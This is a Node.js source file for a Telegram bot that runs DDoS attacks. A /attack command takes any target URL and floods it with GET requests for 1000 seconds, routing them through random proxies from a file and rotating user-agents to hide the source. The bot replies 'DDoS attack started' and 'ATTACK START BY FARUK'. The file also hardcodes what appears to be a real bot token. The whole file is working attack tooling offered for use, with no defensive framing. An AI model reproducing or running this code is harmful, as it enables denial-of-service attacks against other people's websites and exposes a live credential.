const TelegramBot = require('node-telegram-bot-api');
const request = require('request');
const fs = require('fs');

// Telegram bot token
const token = '6425963991:AAF_5d5cVYitHt2Ya7424qmzn9-CqVfiKII';

// Initialize Telegram bot
const bot = new TelegramBot(token, {polling: true});

// Load proxies from proxy.txt
const proxies = fs.readFileSync('proxy.txt', 'utf8').split('\n').filter(Boolean);

// Load user-agents from ua.txt
const userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n').filter(Boolean);

// Attack function
function attack(targetUrl, duration) {
    const endTime = Date.now() + duration * 1000;
    const interval = setInterval(() => {
        if (Date.now() > endTime) {
            clearInterval(interval);
        } else {
            const proxy = proxies[Math.floor(Math.random() * proxies.length)];
            const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
            request({
                url: targetUrl,
                method: 'GET',
                proxy: 'http://' + proxy,
                headers: {
                    'User-Agent': userAgent
                }
            });
        }
    }, 1000);
}

// Telegram command handler
bot.onText(/\/attack (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const targetUrl = match[1];
    bot.sendMessage(chatId, 'DDoS attack started on ' + targetUrl);
    attack(targetUrl, 1000);
    bot.sendMessage(chatId, 'ATTACK START BY FARUK');
});
